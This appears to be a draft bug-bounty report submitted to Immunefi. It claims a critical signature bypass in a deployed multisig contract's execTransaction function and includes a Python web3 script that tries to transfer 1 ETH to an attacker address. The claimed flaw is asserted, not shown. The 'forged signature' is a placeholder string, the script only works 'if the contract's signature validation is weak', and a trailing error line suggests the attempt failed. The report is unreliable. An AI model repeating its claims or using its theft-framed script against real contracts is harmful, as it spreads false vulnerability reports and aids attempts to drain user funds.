Review your report
Program
Immunefi
Target
https://etherscan.io/address/0x03fd3d61423e6d46dcc3917862fbc57653dc3eb0
Impacts
Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
Severity
Critical
Title
Unauthorized Signature Bypass and Arbitrary Transaction Execution in execTransaction
Description
Brief/Intro The vulnerability in the execTransaction function lies in insufficient validation of input parameters, particularly around signature verification and the to address. If exploited on production or mainnet, an attacker could bypass multisig requirements, perform unauthorized fund transfers, or execute arbitrary code, resulting in significant financial loss and potential compromise of the entire system.

Vulnerability Details The execTransaction function does not adequately validate the signatures parameter, allowing attackers to forge signatures and bypass the multisig requirement. Additionally, the lack of proper checks on the to address and data fields enables unauthorized calls or arbitrary execution. For example

execTransaction( 0, // payableAmount 0x80C96D2b2A0419418B75D54496D998823c48C563, // to address (malicious contract) 1000000000000000000, // value (1 ETH) "0x", // data (empty calldata) 0, // operation (call) 0, // safeTxGas 0, // baseGas 0, // gasPrice address(0), // gasToken address(0), // refundReceiver forgedSignatures // forged signatures );

In this scenario

Forged signatures bypass the intended security of the contract, allowing unauthorized execution Arbitrary to address and data could result in external malicious calls, further exposing the contract to attacks If operation=1 (delegatecall), the contract storage could be maliciously altered Impact Details If exploited, this vulnerability could lead to the following

Unauthorized withdrawal of all funds from the contract Execution of malicious code, potentially compromising connected contracts or systems Reentrancy attacks draining gas tokens or further exploiting the system For example, in a production environment holding 1000 ETH, this exploit could lead to the immediate loss of those funds, directly impacting stakeholders and eroding trust in the platform

References EIP-1271 Standard Signature Validation Solidity Delegatecall Documentation Gnosis Safe Transaction Validation

Proof of concept
Proof of Concept
Python Code Below
from web3 import Web3

Connect to Ethereum Node
w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545")) # Update with your node URL assert w3.isConnected(), "Failed to connect to Ethereum node"

Contract details
contract_address = "0xYourContractAddressHere" # Replace with the target contract address abi = [ # Minimal ABI for execTransaction (update with the actual ABI if needed) { "constant": False, "inputs": [ {"name": "payableAmount", "type": "uint256"}, {"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}, {"name": "data", "type": "bytes"}, {"name": "operation", "type": "uint8"}, {"name": "safeTxGas", "type": "uint256"}, {"name": "baseGas", "type": "uint256"}, {"name": "gasPrice", "type": "uint256"}, {"name": "gasToken", "type": "address"}, {"name": "refundReceiver", "type": "address"}, {"name": "signatures", "type": "bytes"} ], "name": "execTransaction", "outputs": [], "type": "function" } ]

Prepare the contract object
contract = w3.eth.contract(address=contract_address, abi=abi)

Prepare the forged transaction parameters
tx = { "payableAmount": 0, "to": "0xMaliciousAddressHere", # Replace with the attacker's address "value": Web3.toWei(1, "ether"), # Attempt to steal 1 ETH "data": b"", # No calldata "operation": 0, # Call operation "safeTxGas": 0, "baseGas": 0, "gasPrice": 0, "gasToken": "0x0000000000000000000000000000000000000000", "refundReceiver": "0x0000000000000000000000000000000000000000", "signatures": b"forgedsignatureshere" # Replace with forged signature bytes }

Attacker's wallet
attacker_private_key = "0xYourPrivateKeyHere" # Replace with the attacker's private key attacker_address = w3.eth.account.privateKeyToAccount(attacker_private_key).address

Build and sign the transaction
transaction = contract.functions.execTransaction( tx["payableAmount"], tx["to"], tx["value"], tx["data"], tx["operation"], tx["safeTxGas"], tx["baseGas"], tx["gasPrice"], tx["gasToken"], tx["refundReceiver"], tx["signatures"] ).buildTransaction({ "from": attacker_address, "nonce": w3.eth.getTransactionCount(attacker_address), "gas": 300000, "gasPrice": w3.toWei("20", "gwei") })

signed_txn = w3.eth.account.signTransaction(transaction, private_key=attacker_private_key)

Send the transaction
tx_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction) print(f"Transaction sent with hash: {tx_hash.hex()}")

Wait for the transaction receipt
receipt = w3.eth.waitForTransactionReceipt(tx_hash) print(f"Transaction executed with status: {receipt.status}")
Key Details Contract ABI: Update the ABI to match the actual execTransaction function's definition. Forged Signature Replace forgedsignatureshere with an actual forged signature if the contract's signature validation is weak. Environment Test this in a safe and controlled environment like a testnet or local blockchain. Private Key Use only test accounts for security.

Disclaimer This script is provided for educational purposes to demonstrate the vulnerability Exploiting vulnerabilities on production systems without authorization is illegal and unethical. Always seek permission and follow responsible disclosure guidelines.

hex data is odd-length (argument="value", value="0x0", code=INVALID_ARGUMENT, version=bytes/5.7.0)

if not done right
